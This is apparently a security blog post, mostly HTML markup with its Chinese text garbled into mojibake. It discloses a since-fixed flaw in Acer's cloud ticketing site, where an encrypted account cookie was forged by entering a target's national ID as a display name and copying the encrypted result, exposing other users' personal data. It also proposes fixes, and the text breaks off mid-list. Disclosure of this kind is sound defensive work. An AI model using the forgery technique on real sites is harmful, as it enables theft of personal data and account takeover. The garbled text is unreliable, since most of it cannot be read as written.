&lt;p&gt;Cookie ÊòØÈñãÁôºÁ∂≤È†ÅÊáâÁî®Á®ãÂºèÂæàÂ∏∏Âà©Áî®ÁöÑÊù±Ë•øÔºåÂÆÉÊòØÁÇ∫‰∫ÜËß£Ê±∫ HTTP stateless ÁâπÊÄß‰ΩÜÂèàÈúÄË¶ÅÊúâ‰∫íÂãïËÄåÁî¢ÁîüÁöÑ„ÄÇÈñãÁôºËÄÖÊÉ≥Êää‰ªÄÈ∫ºË≥áË®äÊö´Â≠òÂú®Áî®Êà∂ÁÄèË¶ΩÂô®ÈÉΩÂèØ‰ª•ÈÄèÈÅé Cookie ‰æÜÂÆåÊàêÔºåÂè™Ë¶ÅË≥áË®äÈáè‰∏çÂ§ßÊñºÁ¥Ñ 4KB ÁöÑÈôêÂà∂Â∞±Ê≤íÂïèÈ°å„ÄÇÂú®ÈÄôÊ®£ÁöÑÁ©∫ÈñìË£°ÔºåÂèØ‰ª•ÊîæË≥ºÁâ©ËªäÂÖßÁöÑÊö´Â≠òÂïÜÂìÅ„ÄÅÂèØ‰ª•ÂÑ≤Â≠òËÆÄËÄÖÈñ±ËÆÄË®òÈåÑ‰ª•Á≤æÊ∫ñÊé®Ëñ¶Áî¢ÂìÅ„ÄÅÁï∂ÁÑ∂‰πüÂèØ‰ª•ÂØ´ÂÖ•‰∏Ä‰∫õË™çË≠âË≥áË®äËÆì‰ΩøÁî®ËÄÖËÉΩ‰øùÊåÅÁôªÂÖ•ÁãÄÊÖã„ÄÇ&lt;/p&gt;

&lt;p&gt;Cookie Êúâ‰∏Ä‰∫õÂÖàÂ§©‰∏äÁöÑÁº∫ÈªûÔºåÂú®ÊñºË≥áÊñôÊòØÂÑ≤Â≠òÂú®ÁÄèË¶ΩÂô®Á´ØÔºåËÄå‰ΩøÁî®ËÄÖÊòØÂèØ‰ª•‰ªªÊÑè‰øÆÊîπÈÄô‰∫õË≥áÊñôÁöÑ„ÄÇÊâÄ‰ª•Â¶ÇÊûúÁ∂≤Á´ôÁöÑ‰ΩøÁî®ËÄÖË∫´ÂàÜË™çË≠âË≥áË®ä‰æùË≥¥ CookieÔºåÂÅ∑ÂÅ∑Á´ÑÊîπÈÇ£‰∫õË™çË≠âË≥áË®äÔºå‰πüË®±ÊúâÊ©üÊúÉËÉΩÂ§†Ê¨∫È®ôÁ∂≤Á´ôÔºåÁõúÁî®‰ªñ‰∫∫Ë∫´ÂàÜÔºå‰ªäÂ§©Â∞±‰æÜË´áË´áÈÄôÊ®£ÁöÑ‰∏Ä‰ª∂‰∫ãÊÉÖÂêßÔºÅ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ÂïèÈ°åËàáÂõûÂ†±&quot;&gt;ÂïèÈ°åËàáÂõûÂ†±&lt;/h3&gt;

&lt;p&gt;ÊúÉÊÉ≥Ë¶ÅËÅäÈÄôÂÄãË≠∞È°åÔºå‰∏ªË¶ÅÊòØÂõ†ÁÇ∫ÊúÄËøëÂæàÁ¥ÖÁöÑÂÆèÁ¢ÅÈõ≤Á´ØÂîÆÁ•®Á≥ªÁµ±Â∞±ÊòØÊé°Áî® Cookie Ë™çË≠â„ÄÇ‰∏äÈÄ±Âú®Ë®ªÂÜäË©≤Á∂≤Á´ôÊôÇÁúã‰∫Ü‰∏Ä‰∏ã CookieÔºåÁôºÁèæË©≤Á∂≤Á´ôÊ≤íÊúâ‰ΩøÁî® &lt;a href=&quot;https://devco.re/blog/2014/06/03/http-session-protection/&quot;&gt;Session Ê©üÂà∂&lt;/a&gt;ÁöÑË∑°Ë±°Ôºå‰πüÂ∞±ÊòØÂñÆÁ¥îÂà©Áî® Cookie ÁöÑÂÄº‰æÜË™çË≠â„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/acer_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/acer_cookie.png&quot; alt=&quot;ÂÆèÁ¢ÅÈõ≤Á´Ø cookie&quot; title=&quot;ÂÆèÁ¢ÅÈõ≤Á´Ø cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÊñºÊòØÈñãÂßãÂ•ΩÂ•áË™çË≠â‰∏ªË¶ÅÁöÑ‰æùÊìöÊòØ‰ªÄÈ∫ºÔºüÂæûÂúñ‰∏≠ÂèØ‰ª•ÁúãÂà∞ Cookie ÂÄº‰∏¶‰∏çÂ§öÔºåÁåúÊ∏¨Ë©≤Á∂≤Á´ôÂ§ßÊ¶ÇÊúÉÊòØÁúã USER_ID„ÄÅUSER_ACCOUNT ‰æÜÂà§Êñ∑‰Ω†ÊòØÂì™ÂÄã‰ΩøÁî®ËÄÖÔºåÁ®ç‰ΩúÊ∏¨Ë©¶ÂæåÊúÉÁôºÁèæÊúâ‰∫õÈ†ÅÈù¢Âè™‰æùÊìö USER_ACCOUNT ÁöÑÂÄº‰æÜÁ¢∫Ë™çË∫´ÂàÜÔºåËÄå USER_ACCOUNT ÈÄôÂÄãÂÄºÂÖ∂ÂØ¶Â∞±ÊòØ‰ΩøÁî®ËÄÖÁöÑË∫´ÂàÜË≠âÂ≠óËôüÔºå‰πüÂ∞±ÊòØË™™‰ªª‰Ωï‰∫∫Âè™Ë¶ÅË∑üÁ∂≤Á´ôË™™ÊàëÁöÑË∫´ÂàÜË≠âÂ≠óËôüÊòØ‰ªÄÈ∫ºÔºåÁ∂≤Á´ôÂ∞±ÊúÉË™çÁÇ∫‰Ω†ÊòØÈÇ£ÂÄãË∫´ÂàÜË≠âÂ≠óËôüÁöÑ‰ΩøÁî®ËÄÖ„ÄÇÂà©Áî®ÈÄôÈªûË®≠Ë®à‰∏äÁöÑÂ∞èÁëïÁñµÔºåÂ∞±ÂèØ‰ª•Á´äÂèñ‰ªñ‰∫∫ÂÄãË≥áÔºåÊõ¥ÈÄ≤Èöé‰∏ÄÈªûÔºåÁîöËá≥ÂèØ‰ª•Áî®‰æÜÊ∏ÖÁ©∫Âà•‰∫∫ÁöÑÂøóÈ°òÂñÆËÆìÂÖ∂‰ªñ‰ΩøÁî®ËÄÖË≤∑‰∏çÂà∞Á•®„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁôºÁèæÈÄôÂÄãÂïèÈ°åÂæåÔºåÊ±∫ÂÆöÈÄöÂ†± &lt;a href=&quot;https://vulreport.net/&quot;&gt;VulReport ÊºèÊ¥ûÂõûÂ†±Âπ≥Âè∞&lt;/a&gt;ÔºåÁî±Ë©≤Âπ≥Âè∞Áµ±‰∏ÄÈÄöÁü•ÈñãÁôºÂïÜ„ÄÇÈÄôÊòØÊàëÁ¨¨‰∏ÄÊ¨°‰ΩøÁî®ÈÄôÂÄãÂπ≥Âè∞ÔºåÂ∞çÊàëËÄåË®ÄÈÄôÊòØ‰∏ÄÂÄãÊñπ‰æø‰∏îÂ∞çÊï¥È´îË≥áÂÆâÁí∞Â¢ÉÊúâÂä©ÁõäÁöÑÂπ≥Âè∞„ÄÇÊñπ‰æøÈªûÂú®ÊñºÔºåÈÅéÂéªÂ∏∏Â∏∏Âõ∞ÊìæÊñºÁôºÁèæ‰∏Ä‰∫õÁ∂≤Á´ôÊúâË®≠Ë®à‰∏äÁöÑÁñèÂ§±Âçª‰∏çÁü•Ë©≤‰∏çË©≤ÈÄöÂ†±ÔºåÂ¶ÇÊûúË™çË≠òË©≤Á∂≤Á´ôÁöÑÈñãÁôºËÄÖÂÄíÊòØÈÇÑÂ•ΩÂèØ‰ª•Áõ¥Êé•Ë¨õÔºå‰ΩÜÂ∞çÊñºÂÖ∂‰ªñ‰∏çË™çË≠òÁöÑÔºå‰∏Ä‰æÜÊ≤íÊúâÊòéÁ¢∫Á™óÂè£Ôºå‰∫å‰æÜÁ§ôÊñºÂ∑•‰ΩúÈóú‰øÇÊÄïË¢´Ë™çÁÇ∫ÊòØÊï≤Á´πÊßìÔºåÊâÄ‰ª•ÂΩ±Èüø‰∏çÂ§ßÁöÑÊºèÊ¥ûÂèØËÉΩÂ∞±ÊîæÊ∞¥ÊµÅ‰∫Ü„ÄÇÈÄôÊ®£Êîæ‰ªªÂÖ∂ÂØ¶‰∏çÊòØ‰∏Ä‰ª∂ÂÅ•Â∫∑ÁöÑ‰∫ãÊÉÖÔºåÊºèÊ¥ûÂú®È¢®Èö™Â∞±Âú®ÔºåÊúâ‰∫ÜÈÄôÊ®£ÁöÑÂõûÂ†±Âπ≥Âè∞Ëá≥Â∞ëÂèØ‰ª•ÂëäË®¥‰ºÅÊ•≠ÂèØËÉΩÂ≠òÂú®È¢®Èö™ÔºåËá™Â∑±‰πüÂèØ‰ª•ÊîæÂøÉÈÄöÂ†±„ÄÇ‰∫ãÂØ¶‰∏äÔºåÂ∞çÂ≤∏Êúâ&lt;a href=&quot;http://wooyun.org/&quot;&gt;È°û‰ººÁöÑÂπ≥Âè∞&lt;/a&gt;Â∑≤Á∂ìË°å‰πãÊúâÂπ¥ÔºåÊúÄÈ°ØËëóÁöÑÊïàÊûúÔºåÂ∞±ÊòØÂ∞çÂ≤∏Á∂≤Á´ôÂú® 0 day Ë¢´Êè≠Èú≤ÂæåËÉΩÂú®‰∏ÄÈÄ±Â∑¶Âè≥ÂÖ®Âúã‰øÆÂæ©ÔºåËÄå‰ª•ÂæÄÂèØËÉΩÂ•ΩÂ§öÂπ¥ÈÅéÂéª‰∫ÜÊºèÊ¥ûÈÇÑÂú®„ÄÇÈÄôÁúüÁöÑËÉΩÂ§†Âä†ÈÄü‰øùË≠∑‰ºÅÊ•≠Âíå‰ΩøÁî®ËÄÖÔºåÂæàÈ´òËààÂè∞ÁÅ£‰πüÊúâ‰∫ÜÈÄôÊ®£ÁöÑÂπ≥Âè∞ÔºÅ&lt;/p&gt;

&lt;p&gt;Êò®Â§©Êó©‰∏äÊî∂Âà∞‰∫ÜÂπ≥Âè∞ÂõûÂ†±ÂÆèÁ¢ÅÈõ≤Á´ØÂîÆÁ•®Â∑≤Á∂ì&lt;a href=&quot;https://vulreport.net/vulnerability/detail/284&quot;&gt;‰øÆÂæ©ÁöÑÊ∂àÊÅØ&lt;/a&gt;ÔºåÊó¢ÁÑ∂Â∑≤Á∂ì‰øÆÂæ©‰∏îÂÖ¨Èñã‰∫ÜÔºåÂ∞±È†Ü‰æøË¨õËß£ÈÄôÂÄãÂïèÈ°åÁöÑÁ¥∞ÁØÄÂêßÔºÅÂ∏åÊúõÂÖ∂‰ªñÈñãÁôºËÄÖÂèØ‰ª•Âæû‰∏≠È´îÊúÉÂà∞ÊîªÊìäËÄÖÁöÑÊÄùÁ∂≠ÔºåÈÄ≤ËÄåÂÅöÊ¥ΩÁï∂ÁöÑÈò≤Á¶¶„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;È©óË≠âÂèäÂç±ÂÆ≥&quot;&gt;È©óË≠âÂèäÂç±ÂÆ≥&lt;/h3&gt;

&lt;p&gt;ÁÇ∫‰∫ÜÊñπ‰æøÈ©óË≠âËß£Ë™™ÈÄôÂÄãÂïèÈ°åÔºåÈÄôÈÇäÁâπÂà•Áî®ÂÖ©ÂÄã‰∏çÂ≠òÂú®ÁöÑË∫´ÂàÜË≠âÂ≠óËôüÂú®ÂÆèÁ¢ÅÈõ≤Á´ØÂîÆÁ•®Áî≥Ë´ãÂ∏≥ËôüÔºåÂàÜÂà•ÊòØ Z288252522 Âíå Z239398899„ÄÇÊ∏¨Ë©¶ÁõÆÁöÑÊòØÁôªÂÖ•Â∏≥Ëôü Z288252522 ÂæåÁúãÁúãÊòØÂê¶ËÉΩÂà©Áî®‰∏äËø∞ Cookie ÂïèÈ°åËÆÄÂèñ Z239398899 ÁöÑÂÄãË≥á„ÄÇ&lt;/p&gt;

&lt;p&gt;È¶ñÂÖàÁôªÂÖ•Â∏≥Ëôü Z288252522ÔºåÊâæÂà∞‰∏ÄÂÄãÊúÉÂõûÂÇ≥ÂÄãË≥áÁöÑÈ†ÅÈù¢Ôºö&lt;br /&gt;
https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_A_data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_A_data.png&quot; alt=&quot;Á¨¨‰∏ÄÂÄã‰ΩøÁî®ËÄÖÂÄãË≥á&quot; title=&quot;Á¨¨‰∏ÄÂÄã‰ΩøÁî®ËÄÖÂÄãË≥á&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ê≠§ÊôÇÁöÑ Cookie ÂÄºÂ¶Ç‰∏ã&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_A_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_A_cookie.png&quot; alt=&quot;Á¨¨‰∏ÄÂÄã‰ΩøÁî®ËÄÖ cookie&quot; title=&quot;Á¨¨‰∏ÄÂÄã‰ΩøÁî®ËÄÖ cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÂæûÂúñ‰∏≠ÁôºÁèæ Cookie ÁöÑÂÄºÂÖ∂ÂØ¶ÊòØÁ∂ìÈÅéÂä†ÂØÜÁöÑÔºåÈÄôÈªûÂú®‰∏äÈù¢Ë™™ÊòéÊîªÊìäËßÄÂøµÊôÇÂàªÊÑèÊ≤íÊúâÊèêÂèä„ÄÇÊää Cookie ÂÄºÂä†ÂØÜÊòØ‰∏ÄÁ®ÆÈò≤Ê≠¢Âà•‰∫∫‰øÆÊîπ Cookie ÂÄºÁöÑÊñπÂºèÔºåÊîªÊìäËÄÖ‰∏çÁü•ÈÅì Cookie ÂÄºÁöÑÂÖßÂÆπÔºåËá™ÁÑ∂‰πüÁÑ°Ê≥ï‰øÆÊîπ‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄåÈÄôÊ®£ÂÅöÈÇÑÊòØÂ≠òÂú®‰∫õÂæÆÈ¢®Èö™Ôºå‰∏ÄÊó¶ÈÄôÂÄãÂä†Ëß£ÂØÜÊñπÂºèË¢´ÊâæÂà∞ÔºåÊîªÊìäËÄÖÂ∞±Âæó‰ª•‰øÆÊîπ Cookie ÂÖßÂÆπÔºåÈÄ≤ËÄåÁõúÁî®Âà•‰∫∫Ë∫´ÂàÜ„ÄÇÂú®Êú¨‰æã‰∏≠ÔºåËã•ÊÉ≥ÊÜëËëóÊîπËÆä Cookie ÁõúÁî®Âà•‰∫∫Ë∫´ÂàÜÂÖ∂ÂØ¶ÂèØ‰ª•‰∏çÁî®Ëä±ÊôÇÈñìÂéªËß£Âä†ÂØÜÊ≥ïÔºåÈÄôË£°Êúâ‰∏ÄÂÄãÂ∞è trickÔºåÊàëÂÄëÂæûËßÄÂØü‰∏≠È¶¨‰∏äÂ∞±ËÉΩÁôºÁèæÊâÄÊúâ Cookie ÂÄºÈÉΩÊòØÁî®Âêå‰∏ÄÂ•óÂä†ÂØÜÊñπÂºèÔºåËÄå‰∏îÂÖ∂‰∏≠ USER_EMAIL„ÄÅUSER_NAME ÈÄô‰∫õÈÇÑÊòØÊàëÂÄëÂèØ‰ª•‰øÆÊîπÁöÑÂÄº„ÄÇÈÄô‰πüÊÑèÂë≥ËëóÂ¶ÇÊûúÊàëÂÄëÊääÂßìÂêçÊîπÊàêÊàëÂÄëÊÉ≥Ë¶ÅÂä†ÂØÜÁöÑË∫´ÂàÜË≠âÂ≠óËôüÔºå‰º∫ÊúçÂô®Â∞±ÊúÉÂõûÂÇ≥‰∏ÄÂÄãÂä†ÂØÜÂ•ΩÁöÑÂÄºÁµ¶ USER_NAME„ÄÇÊàëÂÄëÁõ¥Êé•‰æÜ‰øÆÊîπÂßìÂêçÁúãÁúãÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;h/assets/img/blog/20150130/change_name.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/change_name.png&quot; alt=&quot;‰øÆÊîπÂßìÂêçÊàêË∫´ÂàÜË≠âÂ≠óËôü&quot; title=&quot;‰øÆÊîπÂßìÂêçÊàêË∫´ÂàÜË≠âÂ≠óËôü&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Áï∂ÂßìÂêçÊîπÊàêÁõÆÊ®ô Z239398899 ÊôÇÔºåCookie ‰∏≠ÁöÑ USER_NAME ÂÄºÂ∞±ÊúÉÊîπËÆäÊàêÊàëÂÄëË¶ÅÁöÑÂä†ÂØÜÁµêÊûú„ÄÇËÄ∂ÔºÅÊòØ‰∏ÄÁ®Æ‰ΩúÊ•≠‰∏çÊúÉÂØ´ÊâæÂá∫È°åËÄÅÂ∏´Âπ´ÂøôÂØ´ÁöÑÊ¶ÇÂøµ XD&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_B_cookie.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_B_cookie.png&quot; alt=&quot;ÊîπËÆäÁ¨¨‰∏ÄÂÄã‰ΩøÁî®ËÄÖ cookie&quot; title=&quot;ÊîπËÆäÁ¨¨‰∏ÄÂÄã‰ΩøÁî®ËÄÖ cookie&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Êé•ËëóÁõ¥Êé•Êää USER_NAME ÁöÑÂÄºÊãø‰æÜÁî®ÔºåË§áË£ΩË≤º‰∏äÂà∞ÁõÆÊ®ôÊ¨Ñ‰Ωç USER_ACCOUNT ‰∏≠Ôºå‰πãÂæåÂ∞±ÊòØ‰ª• Z239398899 ÁöÑË∫´ÂàÜ‰æÜËÆÄÂèñÁ∂≤È†Å‰∫Ü„ÄÇÊàëÂÄëÂÜçËÆÄÂèñ‰∏ÄÊ¨° https://www.jody-ticket.com.tw/UTK0196_.aspx ÁúãÁúãÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150130/user_B_data.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150130/user_B_data.png&quot; alt=&quot;Á¨¨‰∫åÂÄã‰ΩøÁî®ËÄÖÂÄãË≥á&quot; title=&quot;Á¨¨‰∫åÂÄã‰ΩøÁî®ËÄÖÂÄãË≥á&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÊàêÂäüÁúãÂà∞ Z239398899 ÁöÑË≥áÊñô‰∫ÜÔºÅÂ¶ÇÊ≠§ÔºåÂ∞±ÂèØ‰ª•Âè™ÊÜë‰∏ÄÂÄãË∫´ÂàÜË≠âÂ≠óËôüËÆÄÂà∞‰ªñ‰∫∫ÁöÑÂú∞ÂùÄÈõªË©±Ë≥áË®äÔºåÁîöËá≥ÂèØ‰ª•Âπ´Âà•‰∫∫Êê∂Á•®ÊàñÂèñÊ∂àÁ•®Âà∏„ÄÇÈÄôÂÄãÊµÅÁ®ãÂØ´ÊàêÁ®ãÂºèÂæåÂè™Ë¶ÅÂÖ©ÂÄã request Â∞±ÂèØ‰ª•ÂòóË©¶ÁôªÂÖ•‰∏ÄÂÄãË∫´ÂàÜË≠âÂ≠óËôüÔºåË¶ÅÂ§ßÈáèÂÅ∑ÂèñÊúÉÂì°ÂÄãË≥á‰πüÊòØÂèØË°åÁöÑ‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;Ë™™Âà∞ÈÄôÈÇäÔºå‰πüË®±Êúâ‰∫∫ÊúÉË≥™ÁñëË¶ÅÁåú‰∏≠Ë®ªÂÜäÂ∏≥Êà∂ÁöÑË∫´ÂàÜË≠âÂ≠óËôüÊòØÊúâÈõ£Â∫¶ÁöÑÔºå‰ΩÜÂÖ∂ÂØ¶Ë¶ÅÂàóËàâÂá∫ÂÖ®Âè∞ÁÅ£ÂèØËÉΩÂú®‰ΩøÁî®ÁöÑË∫´ÂàÜË≠âÂ≠óËôü‰∏¶‰∏çÂõ∞Èõ£ÔºåÂÜçÂä†‰∏äÂÆèÁ¢ÅÈõ≤Á´ØÁöÑÁ°¨È´îÂÖ∂ÂØ¶ÊòØÂæà‰∏çÈåØÁöÑÔºå‰∫ãÂØ¶‰πüË≠âÊòéÂÆÉËÉΩÂ§†Âú®&lt;a href=&quot;https://tw.news.yahoo.com/%E6%B1%9F%E8%95%99%E5%8A%A0%E5%A0%B4%E5%94%AE%E7%A5%A8-%E9%A7%AD%E5%AE%A2%E6%94%BB%E6%93%8A4000%E8%90%AC%E6%AC%A1-041458504.html&quot;&gt;Áü≠ÊôÇÈñìËôïÁêÜÂõõÂçÉËê¨ÂÄãË´ãÊ±ÇÁ≥ªÁµ±‰ªç‰øùÊåÅÁ©©ÂÆö&lt;/a&gt;ÔºåÂè™Ë¶ÅÊîªÊìäËÄÖÁ∂≤Ë∑Ø‰∏çË¶Å&lt;a href=&quot;http://www.cna.com.tw/news/afe/201501250162-1.aspx&quot;&gt;Âç°Âú®Ëá™ÂÆ∂Â∑∑Â≠êÂè£&lt;/a&gt;ÔºåÂ§öÊ©üÂô®Â§öÁ∑öÁ®ã‰Ωà‰∏ãÂéªÁåúË∫´ÂàÜË≠âÂ≠óËôüÊïàÁéáÊáâË©≤ÂæàÂèØËßÄÔºÅ&lt;/p&gt;

&lt;h3 id=&quot;Âª∫Ë≠∞ÂéüÂâá&quot;&gt;Âª∫Ë≠∞ÂéüÂâá&lt;/h3&gt;

&lt;p&gt;ÈÄôÊ¨°ÁöÑÂïèÈ°åÊòØÂÖ©ÂÄãÂº±ÈªûÁöÑÁµÑÂêàÊîªÊìäÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cookie Âä†ÂØÜÁöÑÂÖßÂÆπÂèØËß£‰πüÂèØÂÅΩÈÄ†ÔºçÈÄèÈÅéÁ∂≤Á´ôÂπ´Âøô&lt;/li&gt;
  &lt;li&gt;ÂäüËÉΩÁº∫Â∞ëÊ¨äÈôêÊéßÁÆ° (Missing Function Level Access Control)ÔºçÈÉ®ÂàÜÈ†ÅÈù¢Âè™ÊÜëË∫´ÂàÜË≠âÂ≠óËôüÂ∞±ÂèØÂ≠òÂèñÂÄãË≥á&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÂÆèÁ¢ÅÈõ≤Á´ØÂîÆÁ•®ÁÇ∫‰∫ÜÊïàÁéáÂíåÂàÜÊµÅÔºå‰ΩøÁî® Cookie Ë™çË≠âÊòØÁõ∏Áï∂ÂêàÁêÜÁöÑË®≠Ë®àÔºåÊâÄ‰ª•Ë¶ÅËß£Ê±∫ÈÄôÂÄãÂïèÈ°åÔºåÂæûÁ¨¨‰∫åÈªû‰æÜËß£Ê±∫ÊúÉÊòØÊúÄÊúâÊïà‰∏îÁ¨¶ÂêàÊàêÊú¨ÁöÑÊñπÂºèÔºåÊÄéÈ∫ºÊîπÂë¢ÔºüÊé®Ê∏¨ÂéüÊú¨ÁöÑ SQL Ë™ûÂè•ÊáâË©≤È°û‰ººÈÄôÊ®£Ôºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ACCOUNT&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Áî±Êñº USER_ACCOUNT ÊòØË∫´ÂàÜË≠âÂ≠óËôüÔºåÂÆπÊòìÁ™ÆËàâÔºåÊõ¥Âö¥Ë¨πÁöÑ‰ΩúÊ≥ïÂèØ‰ª•Â§öÂà§Êñ∑‰∏ÄÂÄã idÔºåÂÉèÊòØÈÄôÊ®£Ôºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ACCOUNT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USER_ID&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÂæûÂè™ÈúÄË¶ÅÂëäË®¥‰º∫ÊúçÂô®Ë∫´ÂàÜË≠âÂ≠óËôüÂ∞±ÂõûÂÇ≥ÊúÉÂì°Ë≥áÊñôÔºåÂà∞ËÆäÊàêÈúÄË¶ÅË∫´ÂàÜË≠âÂ≠óËôüÂíåÊúÉÂì°Á∑®ËôüÂêåÊôÇÊ≠£Á¢∫ÊâçÊúÉÂõûÂÇ≥ÊúÉÂì°Ë≥áÊñôÔºåËá≥Ê≠§ÔºåÊîªÊìäËÄÖÂ∑≤Á∂ìÂæàÈõ£ÂêåÊôÇÁü•ÈÅìÂà•‰∫∫ÁöÑÊúÉÂì°Á∑®ËôüÂíåË∫´ÂàÜË≠âÂ≠óËôü‰∫ÜÔºåÂõ†Ê≠§Â§ßÂ§ßÈôç‰Ωé‰∫ÜË¢´Áåú‰∏≠ÁöÑÊ©üÁéáÔºåÂ¢ûÂä†‰∫ÜÂÆâÂÖ®ÊÄß„ÄÇ&lt;/p&gt;

&lt;p&gt;Cookie ‰∏ÄÁõ¥‰ª•‰æÜÈÉΩÊòØ Web Application Security È†òÂüüÁöÑÂÖµÂÆ∂ÂøÖÁà≠‰πãÂú∞ÔºåÊîªÊìäËÄÖÁÑ°‰∏çÁµûÁõ°ËÖ¶Ê±ÅÊÉ≥ÂÅ∑Âà∞ÊàñÂÅΩÈÄ†ÂÆÉÔºåÂâçÈô£Â≠êËàâËæ¶ÁöÑ &lt;a href=&quot;http://girls.hitcon.org/&quot;&gt;HITCON GIRLS&lt;/a&gt; Web Ë™≤Â†ÇÁ∑¥ÁøíÈ°åÁ¨¨‰∏ÄÈ°åÂ∞±ÊòØÊîπ Cookie ‰æÜÂÅΩÈÄ†Ë∫´ÂàÜÔºåË∂≥Ë¶ãÈÄôÂÄãÂïèÈ°åÊúâÂ§öÂü∫Êú¨ÂíåÈáçË¶Å„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈóúÊñº CookieÔºåÈÄôË£°Êèê‰æõ‰∏ÄÈªûÂéüÂâáÂíåÊ¶ÇÂøµ‰æõÂ§ßÂÆ∂ÂèÉËÄÉÔºö&lt;/p&gt;

&lt;p&gt;È¶ñÂÖàÔºåCookie ÊòØÂ≠òÂú®ÂÆ¢Êà∂Á´ØÁöÑÔºåÊâÄ‰ª•ÊúâÊ©üÊúÉË¢´ÁúãÂà∞„ÄÅË¢´Á´ÑÊîπ„ÄÅË¢´ÂÖ∂‰ªñ‰∫∫ÂÅ∑Ëµ∞„ÄÇÂü∫ÊñºÈÄô‰∫õÂéüÂõ†Ôºå‰∏çÂª∫Ë≠∞Âú® Cookie ‰∏≠ÂÑ≤Â≠òÊ©üÊïèË≥áÊñôÔºåÊàñÊòØÂ≠òÊîæÊúÉÂΩ±Èüø‰º∫ÊúçÂô®ÈÅã‰ΩúÁöÑÈáçË¶ÅÂèÉÊï∏ÔºåÈúÄË©ï‰º∞‰∏Ä‰∏ãÈÄô‰∫õÊö´Â≠òË≥áÊñôË¢´‰∫∫ÂÆ∂ÁúãÂà∞Êàñ‰øÆÊîπÊòØ‰∏çÊòØÊ≤íÂ∑ÆÔºåÈÄôÊòØÂÑ≤Â≠òÁöÑÂéüÂâá„ÄÇÂ¶ÇÊûúÊ¨äË°°ÂæåÈÇÑÊòØË¶ÅÂú® Cookie ‰∏≠Â≠òÊîæÈáçË¶ÅË≥áÊñôÔºåÈÇ£Â∞±ÈúÄË¶ÅÂ∞çÂÄºÂä†ÂØÜÈÅøÂÖçË¢´ËÆÄÊîπÔºåËÄå‰∏îË¶ÅÁ¢∫‰øùÂä†ÂØÜÁöÑÂº∑Â∫¶‰ª•ÂèäÂÖ∂‰ªñ‰∫∫ÊòØÂê¶ËÉΩÈÄèÈÅéÂÖ∂‰ªñÊñπÊ≥ïËß£Êûê‰øÆÊîπ„ÄÇÊúÄÂæåÔºåCookie ÊúÄÂ∏∏Ë¢´ÂÅ∑Ëµ∞ÁöÑÊñπÂºèÊòØÈÄèÈÅé JavaScriptÔºåÊâÄ‰ª•Âª∫Ë≠∞Âú®ÈáçË¶ÅÁöÑ Cookie Âä†‰∏ä &lt;a href=&quot;https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/&quot;&gt;HttpOnly flag&lt;/a&gt; ËÉΩÊúâÊïàÁöÑÈôç‰ΩéË¢´ÂÅ∑Ëµ∞ÁöÑÊ©üÁéá„ÄÇ‰πü‰æÜË©¶ËëóÊï¥ÁêÜ‰∏Ä‰∏ãÈÄô‰∏ÄÂ∞èÊÆµÁöÑÈáçÈªûÔºö&lt;/p&gt;

&lt;ul class=&quot;devcore&quot;&gt;
